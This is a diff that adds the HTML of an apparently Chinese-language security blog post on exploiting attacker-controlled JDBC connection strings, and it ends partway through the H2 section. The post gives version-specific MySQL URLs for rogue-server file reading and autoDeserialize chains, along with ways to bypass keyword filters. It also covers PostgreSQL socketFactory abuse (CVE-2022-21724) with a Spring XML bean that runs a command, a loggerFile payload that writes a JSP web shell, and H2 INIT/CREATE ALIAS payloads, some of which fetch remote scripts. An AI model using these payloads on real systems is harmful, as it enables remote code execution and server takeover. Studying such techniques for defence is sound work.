@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="mayylu">
+
+
+
+    <meta name="description" content="学习是一种生活态度">
+
+
+
+<title>JDBC 利用 | mayylu&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/vue.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const pagebody = document.getElementsByTagName('body')[0]
+
+            function setTheme(status) {
+
+                if (status === 'dark') {
+                    window.sessionStorage.theme = 'dark'
+                    pagebody.classList.add('dark-theme');
+
+                } else if (status === 'light') {
+                    window.sessionStorage.theme = 'light'
+                    pagebody.classList.remove('dark-theme');
+                }
+            };
+
+            setTheme(window.sessionStorage.theme)
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/categories">Categories</a>
+                
+                <a class="menu-item" href="/tags">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">
+                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
+                </div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/categories">Categories</a>
+                
+                <a class="menu-item" href="/tags">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.classList.contains("active")) {
+            toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        } else {
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">JDBC 利用</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">八月 3, 2026&nbsp;&nbsp;17:20:11</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/java/">java</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>个人感觉白盒漏洞分为三种<br>一种就是业务层漏洞，比如文件上传，sql注入,逻辑漏洞，或者git管理系统可能存在命令执行，论坛评论区的xss,这些漏洞与语言无关，是在该业务使用场景下不可避免的存在的问题<br>一种就是组件层漏洞，比如fastjson，log4j，shiro反序列化等，组件想要通用设计比较复杂，并且不像业务层有很多输出需求，审计的化乱而杂<br>一种就是语言层漏洞，比如php的phar反序列化，java的jdbc反序列化等，这种漏洞属于语言设计中存在不合理，给了很多没必要默认开启的功能，造成了有语言特色的漏洞</p>
+<p>JDBC（Java Database Connectivity）是 Java 语言中访问数据库的标准 API，最简单最直观JDBC利用就是后台让你配置数据库，这时你就可以考虑通过jdbc获取shell。<br>PHP 常用的数据库驱动是 mysqli、PDO 等扩展，这些驱动在解析连接字符串时 功能非常有限，基本只允许简单参数，不会默认触发危险行为。而JDBC 支持 jdbc:mysql://host/db?param=xxx 这种灵活格式，JDBC 驱动 在解析数据库连接 URL 时支持一些功能参数，攻击者如果能控制 JDBC 连接串，就可能利用这些参数触发危险操作<br> <span id="more"></span></p>
+<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>当mysql连接类似于url,当连接字符串可控时，在连接时带有特殊的参数部分就会产生漏洞</p>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>mysql认为客户端不应该连接到不可信的服务端。服务端可以要求客户端读取有可读权限的任何文件。<br>在mysql 8.0.14版本下无需进行任何参数设置，可以直接读取任意文件,当攻击者连接上该版本的恶意mysql数据库，就会被反向读取文，并且因为是读取客户端本地文件所以不受secure_file_priv的限制，当然前提是运行客户端的用户具有读取该文件的权限</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//allowLoadLocalInfile</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">String url = <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?user=fileread_C:/boot.ini&amp;maxAllowedPacket=655360&amp;allowLoadLocalInfile=true&quot;</span>;</span><br><span class="line">Connection con = DriverManager.getConnection(url);</span><br><span class="line"><span class="comment">//allowUrlInLocalInfile,这里其实算是一个ssrf</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">String url = <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?user=fileread_file:///etc/passwd&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true&quot;</span>;</span><br><span class="line">Connection con = DriverManager.getConnection(url);</span><br></pre></td></tr></table></figure>
+<p>恶意mysql服务端 <code>https://github.com/rmb122/rogue_mysql_server</code></p>
+<h3 id="Java环境下的反序列化"><a href="#Java环境下的反序列化" class="headerlink" title="Java环境下的反序列化"></a>Java环境下的反序列化</h3><p>测试工具使用的是<code>https://github.com/4ra1n/mysql-fake-server</code>,测试的版本为6.0.2</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这俩链子的最终利用点都是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getObject:1402, ResultSetImpl (com.mysql.cj.jdbc)</span><br><span class="line">resultSetToMap:91, ResultSetUtil (com.mysql.cj.jdbc.util)</span><br></pre></td></tr></table></figure>
+<p>resultSetToMap字如其名会将sql执行结果放到结果map里，而取值操作使用到getObject</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">resultSetToMap</span><span class="params">(Map mappedValues, java.sql.ResultSet rs, <span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">      <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">          mappedValues.put(rs.getObject(key), rs.getObject(value));</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>getObject取值时如果字段类型为BLOB，并且autoDeserialize为ture，就会自动检测是否为反序列化数据，并尝试反序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> BLOB:</span><br><span class="line">               <span class="keyword">if</span> (field.isBinary() || field.isBlob()) &#123;</span><br><span class="line">                   <span class="keyword">byte</span>[] data = getBytes(columnIndex);</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">if</span> (<span class="keyword">this</span>.connection.getPropertySet().getBooleanReadableProperty(PropertyDefinitions.PNAME_autoDeserialize).getValue()) &#123;</span><br><span class="line">                       Object obj = data;</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">if</span> ((data != <span class="keyword">null</span>) &amp;&amp; (data.length &gt;= <span class="number">2</span>)) &#123;</span><br><span class="line">                           <span class="keyword">if</span> ((data[<span class="number">0</span>] == -<span class="number">84</span>) &amp;&amp; (data[<span class="number">1</span>] == -<span class="number">19</span>)) &#123;</span><br><span class="line">                               <span class="comment">// Serialized object?</span></span><br><span class="line">                               <span class="keyword">try</span> &#123;</span><br><span class="line">                                   ByteArrayInputStream bytesIn = <span class="keyword">new</span> ByteArrayInputStream(data);</span><br><span class="line">                                   ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(bytesIn);</span><br><span class="line">                                   obj = objIn.readObject();</span><br><span class="line">                                   objIn.close();</span><br></pre></td></tr></table></figure>
+<p>所以autoDeserialize 作用是自动检测与反序列化存在BLOB字段中的对象。是必须的</p>
+<p>所以现在的目标变为如何让 数据库连接时，<strong>自动触发执行查询操作</strong></p>
+<h4 id="detectCustomCollations链"><a href="#detectCustomCollations链" class="headerlink" title="detectCustomCollations链"></a>detectCustomCollations链</h4><p>detectCustomCollations 是 MySQL Connector/J 的连接参数（Connection Property），作用是：<br>是否让 JDBC 驱动自动检测 MySQL 服务器上的自定义 Collation（排序规则），并更新驱动内部的字符集/排序规则映射表</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buildCollationMapping</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">..............</span><br><span class="line">            <span class="keyword">if</span> (getPropertySet().getBooleanReadableProperty(PropertyDefinitions.PNAME_detectCustomCollations).getValue()) &#123;</span><br><span class="line">...............</span><br><span class="line">                    stmt = getMetadataSafeStatement();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        results = stmt.executeQuery(<span class="string">&quot;SHOW COLLATION&quot;</span>);</span><br><span class="line">                        ResultSetUtil.resultSetToMap(sortedCollationMap, results, <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
+<p>当detectCustomCollations为true时，会触发SHOW COLLATION查询</p>
+<pre><code>5.1.19-5.1.28：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc
+5.1.29-5.1.48：jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc
+5.1.49：不可用
+6.0.2-6.0.6：jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc
+8.x.x ：不可用
+</code></pre>
+<h4 id="ServerStatusDiffInterceptor链"><a href="#ServerStatusDiffInterceptor链" class="headerlink" title="ServerStatusDiffInterceptor链"></a>ServerStatusDiffInterceptor链</h4><p>ServerStatusDiffInterceptor是一个拦截器，在JDBC URL中设置属性queryInterceptors(8.0以下为statementInterceptors)为ServerStatusDiffInterceptor时，执行查询语句会调用拦截器的 preProcess 和 postProcess 方法</p>
+<p>ServerStatusDiffInterceptor#preProcess方法有执行SHOW SESSION STATUS操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ResultSetInternalMethods <span class="title">preProcess</span><span class="params">(String sql, Statement interceptedStatement, JdbcConnection connection)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line"></span><br><span class="line">       populateMapWithSessionStatusValues(connection, <span class="keyword">this</span>.preExecuteValues);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">null</span>; <span class="comment">// we don&#x27;t actually modify a result set</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">populateMapWithSessionStatusValues</span><span class="params">(JdbcConnection connection, Map&lt;String, String&gt; toPopulate)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       java.sql.Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">       java.sql.ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           toPopulate.clear();</span><br><span class="line"></span><br><span class="line">           stmt = connection.createStatement();</span><br><span class="line">           rs = stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);</span><br><span class="line">           ResultSetUtil.resultSetToMap(toPopulate, rs);</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (rs != <span class="keyword">null</span>) &#123;</span><br><span class="line">               rs.close();</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (stmt != <span class="keyword">null</span>) &#123;</span><br><span class="line">               stmt.close();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+
+<pre><code>5.1.0-5.1.10：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc 连接后需执行查询
+5.1.11-5.x.xx：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc
+6.x：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc （包名中添加cj）
+8.0.20以下：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc
+</code></pre>
+<h3 id="绕过检测"><a href="#绕过检测" class="headerlink" title="绕过检测"></a>绕过检测</h3><p>大小写绕过<br>true改成yes<br>由于MySQL驱动允许URL编码，这样就可以绕过关键字<code>autoDeserialize=%74%72%75%65</code><br>通过#号注释掉强行添加的内容<br>采用键值模式<code>jdbc:mysql://(host=myhost,port=1111,key1=value1)/db</code></p>
+<h2 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h2><h3 id="任意方法调用"><a href="#任意方法调用" class="headerlink" title="任意方法调用"></a>任意方法调用</h3><p>PgJDBC 为java关于Postgresql数据库引擎，现只有俩个版本系列，为42.x.x和9.x.x。42系列是最新的系列，现在最新的到42.7</p>
+<p><code>socketFactory</code>参数 用于指定 创建普通 Socket 的工厂类，然后使用它创建所有数据库连接 Socket。默认为<code>java.net.Socket</code><br>在 9.4.1208 &lt;=PgJDBC &lt;42.2.25<br>42.3.0 &lt;=PgJDBC &lt; 42.3.2 ，期间 PgJDBC并不强制要求socketFactory继承于<code>javax.net.SocketFactory</code>，导致任意类的构造方法被调用，这就是CVE-2022-21724漏洞的产生原因</p>
+<p><code>org.postgresql.util.ObjectFactory#instantiate</code>为实例化socketFactory类的地方</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">instantiate</span><span class="params">(String classname, Properties info, <span class="keyword">boolean</span> tryString,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="meta">@Nullable</span> String stringarg)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> ClassNotFoundException, SecurityException, NoSuchMethodException,</span></span><br><span class="line"><span class="function">          IllegalArgumentException, InstantiationException, IllegalAccessException,</span></span><br><span class="line"><span class="function">          InvocationTargetException </span>&#123;</span><br><span class="line">    <span class="meta">@Nullable</span> Object[] args = &#123;info&#125;;</span><br><span class="line">    Constructor&lt;?&gt; ctor = <span class="keyword">null</span>;</span><br><span class="line">    Class&lt;?&gt; cls = Class.forName(classname);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      ctor = cls.getConstructor(Properties.class);<span class="comment">//以Properties为参数构造方法调用</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tryString &amp;&amp; ctor == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        ctor = cls.getConstructor(String.class);<span class="comment">//尝试单参数构造方法调用</span></span><br><span class="line">        args = <span class="keyword">new</span> String[]&#123;stringarg&#125;;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (NoSuchMethodException ignored) &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ctor == <span class="keyword">null</span>) &#123;</span><br><span class="line">      ctor = cls.getConstructor();<span class="comment">//尝试无参数构造方法调用</span></span><br><span class="line">      args = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ctor.newInstance(args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>反射获取Class，通过 newInstance 实例化对象，同时 args 作为参数<br>因此只要找到一个构造方法只有一个参数且是String类型这样条件的类即可</p>
+<p><code>jdbc:postgresql://127.0.0.1:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://target/exp.xml</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;exec&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>cmd.exe<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h3><p>42.1.0 &lt;= PostgreSQL &lt;42.3.3<br><code>jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=DEBUG&amp;loggerFile=./test.jsp&amp;&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</code></p>
+<h2 id="h2"><a href="#h2" class="headerlink" title="h2"></a>h2</h2><p>H2数据库是一款以Java编写的轻量级关系型数据库。支持内存（mem:）和文件（file:）两种模式<br>文件模式，H2 会像 MySQL、PostgreSQL 等传统数据库一样，将数据（表、索引等）持久化到磁盘上的物理文件中<br><code>jdbc:h2:file:[路径]/[数据库文件名];</code>,没文件就新建文件<br>内存模式，数据库完全在内存中运行，默认情况下，当所有到该内存数据库的连接都关闭时，数据库及其数据会立即被销毁<br><code>jdbc:h2:mem:[数据库名];</code>，内存没用就新建一个空数据库</p>
+<h3 id="利用需要存在jdk环境"><a href="#利用需要存在jdk环境" class="headerlink" title="利用需要存在jdk环境"></a>利用需要存在jdk环境</h3><p>可以通过设置 <strong>INIT=RUNSCRIPT</strong> 让系统加载sql文件，<br><code>INIT</code> 这个参数表示在连接h2数据库时，支持执行一条初始化命令。<br><code>RUNSCRIPT</code> 通常用于执行一个SQL文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String url = <span class="string">&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:7777/poc.sql&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>而在H2数据库中，我们可以使用 <strong>CREATE ALIAS</strong> 来定义一个 Java 方法，然后通过 <strong>CALL</strong> 来执行这个方法</p>
+<p>poc.sql如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS <span class="keyword">EXEC</span> <span class="keyword">AS</span></span><br><span class="line"> $$void shellexec() throws java.io.IOException &#123;Runtime.getRuntime().<span class="keyword">exec</span>(&quot;calc&quot;);&#125;$$;</span><br><span class="line"> <span class="keyword">CALL</span> <span class="keyword">EXEC</span>();</span><br></pre></td></tr></table></figure>
+<p>上述数据库需要执行java代码，这个过程会涉及到调用 javac 命令进行编译操作，而这个 API 由 JDK 提供</p>
+<p>不出网利用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String url = <span class="string">&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS &#x27;void shellexec(String cmd) throws java.lang.Exception &#123;Runtime.getRuntime().exec(cmd)\\;&#125;&#x27;\\;CALL EXEC (&#x27;calc.exe&#x27;)\\;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="低版本下利用js执行"><a href="#低版本下利用js执行" class="headerlink" title="低版本下利用js执行"></a>低版本下利用js执行</h3><p>在jdk15之后Nashorn JavaScript 引擎被删除，因此下述在jdk15之后无法利用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String JDBC_URL = <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;cmd /c calc.exe&#x27;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;$$\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="存在Groovy-依赖"><a href="#存在Groovy-依赖" class="headerlink" title="存在Groovy 依赖"></a>存在Groovy 依赖</h3><p>下述利用需要额外引入了groovy的依赖</p>
